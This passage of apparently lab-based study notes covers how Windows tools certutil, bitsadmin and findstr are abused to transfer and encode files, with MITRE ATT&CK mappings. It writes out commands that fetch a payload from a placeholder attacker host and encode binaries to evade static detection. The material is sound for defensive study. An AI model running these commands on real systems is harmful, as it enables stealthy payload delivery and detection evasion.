These techniques allow attackers to operate **without dropping custom tools**, thereby reducing detection.

---

## Certutil

### Description

`certutil.exe` is a **native Windows utility** used for managing **Certificate Services (CA)**.  
Although designed for certificate-related tasks, it can be **abused for file transfer and encoding**, making it a popular LOLBin.

- **MITRE ATT&CK Technique (Download):**  
    **T1105 – Ingress Tool Transfer**
    
- **MITRE ATT&CK Technique (Encoding):**  
    **T1027 – Obfuscated Files or Information**
    

---

### File Download Using Certutil

Certutil can download files from a remote HTTP server.

**Command:**

`certutil -URLcache -split -f http://Attacker_IP/payload.exe C:\Windows\Temp\payload.exe`

**Parameters Explained:**

- `-URLcache` → Enables URL handling
    
- `-split` → Downloads file in segments
    
- `-f` → Forces overwrite if file exists
    

**Use Case:**

- Stealthy payload retrieval
    
- Bypasses some application allowlists
    

---

### File Encoding Using Certutil

Certutil can encode binaries into text format (Base64).

**Command:**

`certutil -encode payload.exe Encoded-payload.txt`

**Purpose:**

- Obfuscation
    
- Evasion of static detection
    
- Safe transfer through text-only channels
    

---

## BITSAdmin

### Description

`bitsadmin.exe` is a system administration tool for managing **Background Intelligent Transfer Service (BITS)** jobs.

BITS characteristics:

- Low bandwidth usage
    
- Asynchronous
    
- Supports HTTP and SMB transfers
    
- **MITRE ATT&CK Technique:**  
    **T1197 – BITS Jobs**
    

---

### File Download Using BITSAdmin

Attackers can abuse BITS to download payloads quietly.

**Command:**

`bitsadmin.exe /transfer /Download /priority Foreground http://Attacker_IP/payload.exe C:\Users\thm\Desktop\payload.exe`

**Parameters Explained:**

- `/transfer` → Starts a transfer job
    
- `/Download` → Specifies download operation
    
- `/priority Foreground` → Executes immediately
    

**Why Attackers Use It:**

- Blends with legitimate Windows activity
    
- Often allowed through firewalls and proxies
    

---

## FindStr

### Description

`findstr.exe` is a built-in Windows tool used to **search for strings or patterns** in files or command output.

**Legitimate Example:**

`netstat -an | findstr "445"`

Used to check whether port **445** is open.

---

### Abusing FindStr for File Transfer (SMB)

FindStr can be abused to copy files from **network shares**.

**Command:**

`findstr /V dummystring \\MachineName\ShareFolder\test.exe > C:\Windows\Temp\test.exe`

**Parameters Explained:**

- `/V` → Outputs lines that **do not contain** the string
    
- `dummystring` → String guaranteed not to exist
    
- `>` → Redirects output to a local file